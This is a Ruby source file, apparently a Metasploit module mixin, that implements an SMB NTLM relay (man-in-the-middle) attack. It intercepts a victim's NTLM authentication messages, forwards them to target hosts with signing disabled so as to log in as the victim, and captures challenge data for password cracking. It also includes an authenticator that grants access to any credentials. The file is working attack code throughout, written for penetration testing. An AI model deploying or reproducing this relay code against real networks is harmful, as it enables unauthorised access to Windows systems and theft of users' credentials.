module Msf::Exploit::Remote::SMB::Mitm

  # This class represents a single connected client to the server. It stores and processes connection specific related
  # information.
  # Has overridden methods than allow smb relay attacks.
  class MITMServerClient < ::RubySMB::Server::ServerClient

    def initialize(server, dispatcher, relay_timeout:, relay_targets:, listener:)
      super(server, dispatcher)

      @timeout = relay_timeout
      @relay_targets = relay_targets
      @relay_timeout = relay_timeout
      @listener = listener
    end

    def do_tree_connect_smb2(request, session)
      # Attempt to select the next target to relay to
      session.metadata[:relay_target] = @relay_targets.next
      # If there's no more targets to relay to, just tree connect to the currently running server instead
      if session.metadata[:relay_target].nil?
        logger.debug("All targets relayed to")
        return super(request, session)
      end

      relayed_connection = create_mitm_client(
        session.metadata[:relay_target],
        @relay_timeout
      )
      session.metadata[:relayed_connection] = relayed_connection
      session.metadata[:relay_mode] = true
      session.state = :in_progress

      response = RubySMB::SMB2::Packet::TreeConnectResponse.new
      response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_NETWORK_SESSION_EXPIRED.value
      # response.smb2_header.message_id = request.smb2_header.message_id
      # response.smb2_header.session_id = session.session_id

      # TODO: Add response.tree_id etc
      # response.smb2_header.tree_id = tree_id

      # Credits
      response.smb2_header.credit_charge = 0
      response.smb2_header.credits = 1

      # Share Type
      response.share_type = 0

      # Maximal Access
      response.maximal_access[:read_data] = 1
      response.maximal_access[:write_data] = 1
      response.maximal_access[:append_data] = 1
      response.maximal_access[:read_ea] = 1
      response.maximal_access[:write_ea] = 1
      response.maximal_access[:execute] = 1
      response.maximal_access[:delete_child] = 1
      response.maximal_access[:read_attr] = 1
      response.maximal_access[:write_attr] = 1
      response.maximal_access[:delete_access] = 1
      response.maximal_access[:read_control] = 1
      response.maximal_access[:write_dac] = 1
      response.maximal_access[:write_owner] = 1

      response
    end

    def do_session_setup_smb2(request, session)
      # TODO: Add shared helper for grabbing session lookups
      session_id = request.smb2_header.session_id
      if session_id == 0
        session_id = rand(1..0xfffffffe)
        session = @session_table[session_id] = ::RubySMB::Server::Session.new(session_id)
      else
        session = @session_table[session_id]
        if session.nil?
          response = SMB2::Packet::ErrorPacket.new
          response.smb2_header.nt_status = WindowsError::NTStatus::STATUS_USER_SESSION_DELETED
          return response
        end
      end

      # Perform a normal setup flow with ruby_smb
      if !session&.metadata[:relay_mode]
        response = super
        # TODO: Remove guest flag
        return response
      end

      ntlmssp_result = self.relay_ntlmssp(session, request.buffer)
      return if ntlmssp_result.nil?

      response = ::RubySMB::SMB2::Packet::SessionSetupResponse.new
      response.smb2_header.credits = 1
      response.smb2_header.message_id = request.smb2_header.message_id
      response.smb2_header.session_id = session_id

      if ntlmssp_result.is_a?(::Net::NTLM::Message)
        response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED.value
        response.buffer = ntlmssp_result.serialize

        if @dialect == '0x0311'
          update_preauth_hash(response)
        end

        return response
      else
        response.smb2_header.nt_status = ntlmssp_result.nt_status.value
        response.buffer = ntlmssp_result.buffer
      end

      update_preauth_hash(request) if @dialect == '0x0311'
      if ntlmssp_result.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
        response.smb2_header.credits = 32
        session.state = :valid
        session.user_id = ntlmssp_result.identity
        # TODO: This is invalid now with the relay logic in place
        session.key = @gss_authenticator.session_key
        session.signing_required = request.security_mode.signing_required == 1
      elsif ntlmssp_result.nt_status == WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED && @dialect == '0x0311'
        update_preauth_hash(response)
      end

      response
    end

    def relay_ntlmssp(session, incoming_security_buffer = nil)
      # TODO: Handle GSS correctly
      # gss_result = process_gss(incoming_security_buffer)
      # return gss_result if gss_result
      # TODO: Add support for a default NTLM provider in ruby_smb
      begin
        ntlm_message = Net::NTLM::Message.parse(incoming_security_buffer)
      rescue ArgumentError
        return
      end

      # NTLM negotiation request
      # Choose the next machine to relay to, and send the incoming security buffer to the relay target
      if ntlm_message.is_a?(::Net::NTLM::Message::Type1)
        relayed_connection = session.metadata[:relayed_connection]
        server_type2_msg = relayed_connection.get_peer_server_challenge(incoming_security_buffer)

        # Store the relay target's server challenge, as it is used later when creating the JTR hash
        session.metadata[:relay_target_server_challenge] = [server_type2_msg.challenge].pack('Q<')

        server_type2_msg

      # NTLM challenge, which should never be received from a calling client
      elsif ntlm_message.is_a?(::Net::NTLM::Message::Type2)
        RubySMB::Gss::Provider::Result.new(nil, WindowsError::NTStatus::STATUS_NO_SUCH_LOGON_SESSION)

      # NTLM challenge response
      elsif ntlm_message.is_a?(::Net::NTLM::Message::Type3)
        relayed_connection = session.metadata[:relayed_connection]

        resp = relayed_connection.send_auth_attempt(incoming_security_buffer)

        if resp.smb2_header.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
          logger.debug("Successfully authenticated against relay target")

          @listener.on_ntlm_type3(
            address: relayed_connection.target.ip,
            challenge: session.metadata[:relay_target_server_challenge],
            # TODO: Looks like this isn't implemented correctly in the original implementation
            client_os_version: nil,
            ntlm_message: ntlm_message
          )
          @listener.on_relay_success(relayed_connection)
        else
          logger.debug("Failed authenticating against relay target")
          @listener.on_relay_failure(relayed_connection)
          session.metadata.delete(:relay_mode)
          relayed_connection.logoff!
        end

        RubySMB::Gss::Provider::Result.new(nil, resp.smb2_header.nt_status)

      # Should never occur
      else
        logger.error("Invalid ntlm request")
        RubySMB::Gss::Provider::Result.new(nil, WindowsError::NTStatus::STATUS_NO_SUCH_LOGON_SESSION)
      end
    end

    def create_mitm_client(target, timeout)
      sock = Rex::Socket::Tcp.create(
        'PeerHost' => target.ip,
        'PeerPort' => target.port,
        'Server' => false,
        'Timeout' => timeout,
        'Context' =>
          {
            'Caller' => self
          }
      )

      dispatcher = RubySMB::Dispatcher::Socket.new(sock)
      client = MITMClient.new(dispatcher, provider: self, username: '', password: '',
                              smb1: false, smb2: true, smb3: true, target: target, always_encrypt: false)

      client
    rescue ::Exception => e
      msg = "Unable to create relay to #{peer_host}:#{peer_port}"
      elog(msg, error: e)
      print_warning msg
    end
  end

  class Target
    def initialize(ip, port, protocol)
      @ip = ip
      @port = port
      @protocol = protocol
    end

    attr_reader :ip, :port, :protocol
  end

  # A thread safe target list. The provided targets will be iterated over via the {next} method.
  class TargetList
    include MonitorMixin

    # @param [Array<String>] targets
    def initialize(targets)
      super()
      @walker = Rex::Socket::RangeWalker.new(targets)
    end

    # Return the next available target, or nil
    def next
      synchronize do
        # TODO: Confirm HTTP relay semantics
        Target.new(@walker.next_ip, 445, :smb)
      end
    end
  end

  class MITMClient < ::RubySMB::Client
    attr_reader :target

    def initialize(dispatcher, smb1: true, smb2: true, smb3: true, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil, target: nil)
      super(dispatcher,
            smb1: smb1,
            smb2: smb2,
            smb3: smb3,
            username: username,
            password: password,
            domain: domain,
            local_workstation: local_workstation,
            always_encrypt: always_encrypt,
            ntlm_flags: ntlm_flags)

      @provider = provider
      @target = target
    end

    def get_peer_server_challenge(client_type1_msg)
      @version = negotiate

      if @version == 'SMB1'
        # neg_pkt = smb1_ntlmssp_negotiate_packet
        # neg_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
        # resp = send_recv(neg_pkt)
        #
        # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
        #
        # # Store the available OS information before going forward.
        # @peer_native_os = challenge_packet.data_block.native_os.to_s
        # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
        #
        # @user_id = challenge_packet.smb_header.uid
        #
        # type2_message_encoded = smb1_type2_message(challenge_packet)
        #
        # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
        #
        # type2_challenge.challenge
      else
        # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
        #  - changes the type1_blob to match the blob of the type1 messages received from the client
        #  - returns the challenge messages received from the server

        server_type1_pkt = smb2_ntlmssp_negotiate_packet

        server_type1_pkt.set_ntlm_type1_blob(client_type1_msg)
        server_type1_pkt.security_mode.signing_enabled = 0
        server_type2_pkt_raw = send_recv(server_type1_pkt)
        server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)

        if @dialect == '0x0311'
          update_preauth_hash(server_type2_pkt)
        end

        @session_id = server_type2_pkt.smb2_header.session_id
        type2_ntlm_message = smb2_type2_message(server_type2_pkt)

        Net::NTLM::Message.decode64(type2_ntlm_message)

        # TODO Below commented out code needs moved into auth_attempt
        # Additionally, we need to have the type3 message created using the @ntlm_client.session object
        #   this may require rummaging around in the guts of @ntlm_client and it's session to figure out how
        #   to do that
        #
        # @server_type3_message = @ntlm_client.init_context(type2_ntlm_message)
        #
        # @session_key = @ntlm_client.session_key
        # server_type2_message = @ntlm_client.session.challenge_message
        # store_target_info(server_type2_message.target_info) if server_type2_message.has_flag?(:TARGET_INFO)
        # @os_version = extract_os_version(server_type2_message.os_version.to_s) unless server_type2_message.os_version.empty?
      end
    rescue ::Exception => e
      msg = "Unable to retrieve server challenge at #{self.target.ip}:#{self.target.port}"
      elog(msg, error: e)
      print_warning msg
    end

    def send_auth_attempt(victim_type3_message)
      if @version == 'SMB1'
        # TODO
      else
        packet = RubySMB::SMB2::Packet::SessionSetupRequest.new

        packet.smb2_header.session_id = @session_id
        packet.smb2_header.credits = 127

        packet.security_mode.signing_enabled = 0

        packet.set_ntlm_type3_blob(victim_type3_message)

        response = send_recv(packet)
        if @dialect == '0x0311'
          update_preauth_hash(packet)
        end

        # raw = smb2_ntlmssp_authenticate(victim_type3_message, @session_id)
        response = smb2_ntlmssp_final_packet(response)

        if @smb3 && !@session_encrypt_data && response.session_flags.encrypt_data == 1
          @session_encrypt_data = true
        end

        response
      end
    rescue ::Exception => e
      msg = "Unable to retrieve server challenge at #{self.target.ip}:#{self.target.port}"
      elog(msg, error: e)
      print_warning msg
    end

    def normalize_type3_encoding(type3_msg)
      type3_msg.security_buffers.map!{ |_buffer_name, security_buffer| security_buffer.value.force_encoding("ASCII-8BIT") }
    end

    alias :connect :tree_connect
  end

  # An override for the default RubySMB NTLM Authenticator to always grant access,
  # regardless of the provided credentials
  # TODO: Delete when RubySMB supports logging in without validated credentials
  class AlwaysGrantAccessGssAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator
    def process_ntlm_type3(type3_msg)
      # Override the ntlm type3 validation for now, as the current implementation of the
      # parent class validates user accounts, and doesn't support logging in without valid creds
      ::WindowsError::NTStatus::STATUS_SUCCESS
    end
  end

  #
  # An override for the default RubySMB NTLM Provider to always grant access,
  # regardless of the provided credentials
  # TODO: Delete when RubySMB supports logging in without validated credentials
  class AlwaysGrantAccessGssProvider < ::RubySMB::Gss::Provider::NTLM
    def new_authenticator(server_client)
      AlwaysGrantAccessGssAuthenticator.new(self, server_client)
    end

    attr_reader :relay_targets, :local_host, :timeout, :listener
  end
end
